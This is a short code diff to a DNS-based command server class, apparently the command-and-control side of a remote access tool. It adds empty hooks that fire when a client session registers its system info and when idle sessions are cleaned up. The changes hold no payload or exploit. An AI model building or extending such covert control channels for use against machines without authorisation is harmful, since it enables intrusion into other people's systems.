@@ -147,6 +147,7 @@ class DnsCommandServerHandler(BaseResolver):
                     if session.idle > self.timeout:
                         to_remove.append(spi)
                 for spi in to_remove:
+                    self.on_session_cleaned_up(self.sessions[spi])
                     del self.sessions[spi]
 
                 self.cache = {}
@@ -342,6 +343,12 @@ class DnsCommandServerHandler(BaseResolver):
     def on_exit(self, info):
         pass
 
+    def on_new_session(self, session):
+        pass
+
+    def on_session_cleaned_up(self, session):
+        pass
+
     def _a_page_encoder(self, data, encoder, nonce):
         data = encoder.encode(data, nonce, symmetric=encoder.kex_completed)
 
@@ -484,6 +491,7 @@ class DnsCommandServerHandler(BaseResolver):
 
         elif isinstance(command, SystemInfo) and session is not None:
             session.system_info = command.get_dict()
+            self.on_new_session(session)
 
         elif isinstance(command, Kex):
             with self.lock:
